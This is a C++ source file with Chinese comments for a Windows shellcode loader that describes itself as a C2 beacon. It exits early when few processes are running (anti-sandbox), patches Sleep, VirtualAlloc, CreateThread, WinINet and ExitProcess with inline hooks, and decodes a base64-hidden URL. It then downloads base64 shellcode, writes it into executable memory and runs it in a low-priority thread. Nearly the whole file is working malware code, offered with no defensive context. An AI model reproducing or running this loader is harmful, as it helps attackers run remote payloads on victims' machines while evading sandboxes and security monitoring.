#include <windows.h>
#include <wininet.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
// 全局变量
BYTE g_originalSleepBytes[12] = { 0 };
BYTE g_originalVirtualAllocBytes[12] = { 0 };
BYTE g_originalCreateThreadBytes[12] = { 0 };
BYTE g_originalInternetOpenBytes[12] = { 0 };
BYTE g_originalInternetOpenUrlBytes[12] = { 0 };
BYTE g_originalInternetReadFileBytes[12] = { 0 };
BYTE g_originalExitProcessBytes[12] = { 0 };

FARPROC g_originalSleep = NULL;
FARPROC g_originalVirtualAlloc = NULL;
FARPROC g_originalCreateThread = NULL;
FARPROC g_originalInternetOpen = NULL;
FARPROC g_originalInternetOpenUrl = NULL;
FARPROC g_originalInternetReadFile = NULL;
FARPROC g_originalExitProcess = NULL;

BOOL g_isExecutingShellcode = FALSE;
HANDLE g_shellcodeThread = NULL;
BOOL g_keepRunning = TRUE;
BOOL g_hooksInstalled = FALSE;

// Shellcode 参数结构
typedef struct {
    unsigned char* shellcode;
    SIZE_T size;
} SHELLCODE_PARAMS;

// API类型定义
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* pSleep)(DWORD);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* pGetModuleHandleA)(LPCSTR);
typedef BOOL(WINAPI* pCloseHandle)(HANDLE);
typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL(WINAPI* pGetExitCodeThread)(HANDLE, LPDWORD);
typedef VOID(WINAPI* pExitProcess)(UINT);
typedef HINTERNET(WINAPI* pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET(WINAPI* pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);

// 原始API函数指针
pVirtualAlloc originalVirtualAlloc = NULL;
pVirtualProtect myVirtualProtect = NULL;
pWriteProcessMemory myWriteProcessMemory = NULL;
pCreateThread originalCreateThread = NULL;
pSleep originalSleep = NULL;
pExitProcess originalExitProcess = NULL;
pInternetOpenA originalInternetOpenA = NULL;
pInternetOpenUrlA originalInternetOpenUrlA = NULL;
pInternetReadFile originalInternetReadFile = NULL;

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")


// 声明钩子函数
DWORD WINAPI HookedSleep(DWORD dwMilliseconds);
LPVOID WINAPI HookedVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
HANDLE WINAPI HookedCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,
    DWORD dwCreationFlags, LPDWORD lpThreadId);
HINTERNET WINAPI HookedInternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy,
    LPCSTR lpszProxyBypass, DWORD dwFlags);
HINTERNET WINAPI HookedInternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders,
    DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
BOOL WINAPI HookedInternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
VOID WINAPI HookedExitProcess(UINT uExitCode);

// Base64解码函数
std::vector<BYTE> Base64Decode(const std::string& encoded_string) {
    static const std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    std::vector<BYTE> ret;
    int i = 0, j = 0;
    unsigned char char_array_4[4], char_array_3[3];

    size_t in_len = encoded_string.size();
    size_t pos = 0;

    while (pos < in_len && encoded_string[pos] != '=') {
        if (isalnum(encoded_string[pos]) || encoded_string[pos] == '+' || encoded_string[pos] == '/') {
            char_array_4[i++] = encoded_string[pos];
            pos++;
        }
        else {
            pos++;
            continue;
        }

        if (i == 4) {
            for (i = 0; i < 4; i++) {
                char_array_4[i] = static_cast<unsigned char>(base64_chars.find(char_array_4[i]));
            }

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0x0F) << 4) + ((char_array_4[2] & 0x3C) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x03) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++) {
                ret.push_back(char_array_3[i]);
            }
            i = 0;
        }
    }

    if (i > 0) {
        for (j = i; j < 4; j++) {
            char_array_4[j] = 0;
        }

        for (j = 0; j < 4; j++) {
            char_array_4[j] = static_cast<unsigned char>(base64_chars.find(char_array_4[j]));
        }

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0x0F) << 4) + ((char_array_4[2] & 0x3C) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x03) << 6) + char_array_4[3];

        for (j = 0; j < i - 1; j++) {
            ret.push_back(char_array_3[j]);
        }
    }

    return ret;
}

// 辅助函数：Base64 解码为 std::string
std::string Base64DecodeToString(const std::string& encoded) {
    std::vector<BYTE> decoded = Base64Decode(encoded);
    return std::string(decoded.begin(), decoded.end());
}

// 反沙箱：检测进程数
DWORD CountRunningProcesses() {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        return 0;
    }
    cProcesses = cbNeeded / sizeof(DWORD);
    return cProcesses;
}

// 设置 API 挂钩
BOOL SetApiHook(FARPROC targetFunc, FARPROC hookFunc, BYTE* originalBytes, const char* funcName) {
    if (!targetFunc || !hookFunc) {
        return FALSE;
    }

    // 保存原始字节
    memcpy(originalBytes, targetFunc, 12);

    // 设置跳转指令
    DWORD oldProtect;
    if (!VirtualProtect(targetFunc, 12, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // x64跳转指令: mov rax, hookFunc; jmp rax
    BYTE jmpCode[12] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };
    *(ULONG_PTR*)&jmpCode[2] = (ULONG_PTR)hookFunc;

    if (!WriteProcessMemory(GetCurrentProcess(), targetFunc, jmpCode, 12, NULL)) {
        VirtualProtect(targetFunc, 12, oldProtect, &oldProtect);
        return FALSE;
    }

    VirtualProtect(targetFunc, 12, oldProtect, &oldProtect);
    return TRUE;
}

// 恢复 API 挂钩
BOOL RestoreApiHook(FARPROC targetFunc, BYTE* originalBytes, const char* funcName) {
    if (!targetFunc) {
        return FALSE;
    }

    DWORD oldProtect;
    if (!VirtualProtect(targetFunc, 12, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    if (!WriteProcessMemory(GetCurrentProcess(), targetFunc, originalBytes, 12, NULL)) {
        VirtualProtect(targetFunc, 12, oldProtect, &oldProtect);
        return FALSE;
    }

    VirtualProtect(targetFunc, 12, oldProtect, &oldProtect);
    return TRUE;
}

// 初始化 API
BOOL InitDynamicAPIs() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hWinInet = GetModuleHandleA("wininet.dll");

    if (!hKernel32 || !hWinInet) {
        return FALSE;
    }

    // 获取原始函数地址
    originalSleep = (pSleep)GetProcAddress(hKernel32, "Sleep");
    originalVirtualAlloc = (pVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    originalCreateThread = (pCreateThread)GetProcAddress(hKernel32, "CreateThread");
    originalExitProcess = (pExitProcess)GetProcAddress(hKernel32, "ExitProcess");

    // 获取WinINet函数地址
    originalInternetOpenA = (pInternetOpenA)GetProcAddress(hWinInet, "InternetOpenA");
    originalInternetOpenUrlA = (pInternetOpenUrlA)GetProcAddress(hWinInet, "InternetOpenUrlA");
    originalInternetReadFile = (pInternetReadFile)GetProcAddress(hWinInet, "InternetReadFile");

    if (!originalSleep || !originalVirtualAlloc || !originalCreateThread ||
        !originalInternetOpenA || !originalInternetOpenUrlA || !originalInternetReadFile) {
        return FALSE;
    }

    return TRUE;
}

// 安装所有钩子
BOOL InstallHooks() {
    if (!InitDynamicAPIs()) {
        return FALSE;
    }

    // 安装各个钩子
    if (!SetApiHook((FARPROC)originalSleep, (FARPROC)HookedSleep, g_originalSleepBytes, "Sleep")) {
        return FALSE;
    }

    if (!SetApiHook((FARPROC)originalVirtualAlloc, (FARPROC)HookedVirtualAlloc, g_originalVirtualAllocBytes, "VirtualAlloc")) {
        return FALSE;
    }

    if (!SetApiHook((FARPROC)originalCreateThread, (FARPROC)HookedCreateThread, g_originalCreateThreadBytes, "CreateThread")) {
        return FALSE;
    }

    if (!SetApiHook((FARPROC)originalInternetOpenA, (FARPROC)HookedInternetOpenA, g_originalInternetOpenBytes, "InternetOpenA")) {
        return FALSE;
    }

    if (!SetApiHook((FARPROC)originalInternetOpenUrlA, (FARPROC)HookedInternetOpenUrlA, g_originalInternetOpenUrlBytes, "InternetOpenUrlA")) {
        return FALSE;
    }

    if (!SetApiHook((FARPROC)originalInternetReadFile, (FARPROC)HookedInternetReadFile, g_originalInternetReadFileBytes, "InternetReadFile")) {
        return FALSE;
    }

    if (!SetApiHook((FARPROC)originalExitProcess, (FARPROC)HookedExitProcess, g_originalExitProcessBytes, "ExitProcess")) {
        return FALSE;
    }

    g_hooksInstalled = TRUE;
    return TRUE;
}

// 卸载所有钩子
void UninstallHooks() {
    if (g_originalSleep) {
        RestoreApiHook((FARPROC)originalSleep, g_originalSleepBytes, "Sleep");
    }
    if (g_originalVirtualAlloc) {
        RestoreApiHook((FARPROC)originalVirtualAlloc, g_originalVirtualAllocBytes, "VirtualAlloc");
    }
    if (g_originalCreateThread) {
        RestoreApiHook((FARPROC)originalCreateThread, g_originalCreateThreadBytes, "CreateThread");
    }
    if (g_originalInternetOpen) {
        RestoreApiHook((FARPROC)originalInternetOpenA, g_originalInternetOpenBytes, "InternetOpenA");
    }
    if (g_originalInternetOpenUrl) {
        RestoreApiHook((FARPROC)originalInternetOpenUrlA, g_originalInternetOpenUrlBytes, "InternetOpenUrlA");
    }
    if (g_originalInternetReadFile) {
        RestoreApiHook((FARPROC)originalInternetReadFile, g_originalInternetReadFileBytes, "InternetReadFile");
    }
    if (g_originalExitProcess) {
        RestoreApiHook((FARPROC)originalExitProcess, g_originalExitProcessBytes, "ExitProcess");
    }
    g_hooksInstalled = FALSE;
}

// ==================== 钩子函数实现 ====================

// Hooked VirtualAlloc - 修改内存分配行为
LPVOID WINAPI HookedVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    // 临时恢复原始函数
    RestoreApiHook((FARPROC)originalVirtualAlloc, g_originalVirtualAllocBytes, "VirtualAlloc");

    // 如果不是RWX权限，直接调用原始函数
    if (flProtect != PAGE_EXECUTE_READWRITE) {
        LPVOID result = originalVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
        SetApiHook((FARPROC)originalVirtualAlloc, (FARPROC)HookedVirtualAlloc, g_originalVirtualAllocBytes, "VirtualAlloc");
        return result;
    }

    // 对于RWX权限，改为RW权限，后续再改RX
    LPVOID pMem = originalVirtualAlloc(lpAddress, dwSize, flAllocationType, PAGE_READWRITE);

    // 重新安装钩子
    SetApiHook((FARPROC)originalVirtualAlloc, (FARPROC)HookedVirtualAlloc, g_originalVirtualAllocBytes, "VirtualAlloc");

    return pMem;
}

// Hooked CreateThread - 修改线程创建行为
HANDLE WINAPI HookedCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,
    DWORD dwCreationFlags, LPDWORD lpThreadId) {
    // 临时恢复原始函数
    RestoreApiHook((FARPROC)originalCreateThread, g_originalCreateThreadBytes, "CreateThread");

    // 创建挂起线程
    HANDLE hThread = originalCreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter,
        dwCreationFlags | CREATE_SUSPENDED, lpThreadId);

    if (hThread) {
        // 设置线程优先级为最低，更隐蔽
        SetThreadPriority(hThread, THREAD_PRIORITY_LOWEST);

        // 恢复线程
        ResumeThread(hThread);
    }

    // 重新安装钩子
    SetApiHook((FARPROC)originalCreateThread, (FARPROC)HookedCreateThread, g_originalCreateThreadBytes, "CreateThread");

    return hThread;
}

// Hooked InternetOpenA - 修改User-Agent
HINTERNET WINAPI HookedInternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy,
    LPCSTR lpszProxyBypass, DWORD dwFlags) {
    RestoreApiHook((FARPROC)originalInternetOpenA, g_originalInternetOpenBytes, "InternetOpenA");

    // 使用正常的浏览器User-Agent
    LPCSTR realAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    HINTERNET hInternet = originalInternetOpenA(realAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);

    SetApiHook((FARPROC)originalInternetOpenA, (FARPROC)HookedInternetOpenA, g_originalInternetOpenBytes, "InternetOpenA");

    return hInternet;
}

// Hooked InternetOpenUrlA
HINTERNET WINAPI HookedInternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders,
    DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext) {
    RestoreApiHook((FARPROC)originalInternetOpenUrlA, g_originalInternetOpenUrlBytes, "InternetOpenUrlA");

    // 添加常见请求头
    LPCSTR commonHeaders = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Connection: keep-alive\r\n";

    HINTERNET hUrl = originalInternetOpenUrlA(hInternet, lpszUrl, commonHeaders,
        strlen(commonHeaders), dwFlags, dwContext);

    SetApiHook((FARPROC)originalInternetOpenUrlA, (FARPROC)HookedInternetOpenUrlA,
        g_originalInternetOpenUrlBytes, "InternetOpenUrlA");

    return hUrl;
}

// Hooked InternetReadFile - 实时解码Base64
BOOL WINAPI HookedInternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {
    RestoreApiHook((FARPROC)originalInternetReadFile, g_originalInternetReadFileBytes, "InternetReadFile");

    BOOL result = originalInternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);

    SetApiHook((FARPROC)originalInternetReadFile, (FARPROC)HookedInternetReadFile, g_originalInternetReadFileBytes, "InternetReadFile");

    return result;
}

// Hooked ExitProcess - 保护进程
VOID WINAPI HookedExitProcess(UINT uExitCode) {
    if (g_isExecutingShellcode) {
        ExitThread(uExitCode);
        return;
    }
    RestoreApiHook((FARPROC)originalExitProcess, g_originalExitProcessBytes, "ExitProcess");
    originalExitProcess(uExitCode);
}

// 下载并执行shellcode的函数
BOOL DownloadAndExecuteShellcode() {
    // 这里会通过钩子调用InternetOpenA/InternetOpenUrlA/InternetReadFile
    // 这些调用会被我们的钩子函数拦截并修改

    const char* b64_encoded_url = "aHR0cDovLzEyNy4wLjAuMTo4MDAwL3NoZWxsY29kZS50eHQ=";
    std::string realUrl = Base64DecodeToString(b64_encoded_url);

    // 网络请求 - 会经过钩子链
    HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, realUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    std::string base64Data;
    char temp[4096];
    DWORD dwBytesRead = 0;

    while (InternetReadFile(hUrl, temp, sizeof(temp) - 1, &dwBytesRead) && dwBytesRead) {
        temp[dwBytesRead] = '\0';
        base64Data.append(temp);
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (base64Data.empty()) {
        return FALSE;
    }

    // 清理空白字符
    base64Data.erase(std::remove_if(base64Data.begin(), base64Data.end(),
        [](unsigned char c) { return std::isspace(c); }),
        base64Data.end());

    // Base64解码
    std::vector<BYTE> decodedData = Base64Decode(base64Data);
    if (decodedData.empty()) {
        return FALSE;
    }

    // 分配内存 - 会经过VirtualAlloc钩子
    LPVOID pExecMem = VirtualAlloc(NULL, decodedData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pExecMem) {
        return FALSE;
    }

    // 复制shellcode
    memcpy(pExecMem, decodedData.data(), decodedData.size());

    // 修改内存保护为RX
    DWORD oldProtect;
    VirtualProtect(pExecMem, decodedData.size(), PAGE_EXECUTE_READ, &oldProtect);

    // 创建线程 - 会经过CreateThread钩子
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecMem, NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    }

    return TRUE;
}

// Hooked Sleep - 触发器
DWORD WINAPI HookedSleep(DWORD dwMilliseconds) {
    // 临时恢复Sleep钩子
    RestoreApiHook((FARPROC)originalSleep, g_originalSleepBytes, "Sleep");

    // 执行shellcode下载和执行
    g_isExecutingShellcode = TRUE;
    DownloadAndExecuteShellcode();
    g_isExecutingShellcode = FALSE;

    // 调用原始Sleep
    DWORD result = originalSleep(dwMilliseconds);

    // 重新安装Sleep钩子
    SetApiHook((FARPROC)originalSleep, (FARPROC)HookedSleep, g_originalSleepBytes, "Sleep");

    return result;
}

// 主函数
int main() {
    // 反沙箱检查
    DWORD dwProcessCount = CountRunningProcesses();
    if (dwProcessCount <= 60) {
        return 0;
    }

    // 隐藏控制台 - 调试时先注释掉
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 安装所有钩子
    if (!InstallHooks()) {
        return 1;
    }

    printf("[*] 所有钩子安装成功\n");
    printf("[*] Hooked functions: Sleep, VirtualAlloc, CreateThread,\n");
    printf("    InternetOpenA, InternetOpenUrlA, InternetReadFile, ExitProcess\n");

    // 触发Sleep钩子，启动整个链
    printf("[*] 触发Sleep钩子...\n");
    Sleep(1000);

    printf("[*] ✅ C2 Beacon 正在运行中...\n");
    printf("[*] 进程将永远运行，按 Ctrl+C 强制终止\n\n");

    // ============= 最简单的修复：永远等待 =============
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    WaitForSingleObject(hEvent, INFINITE);  // 无限等待，永不返回

    // 永远不会执行到这里
    UninstallHooks();
    return 0;
}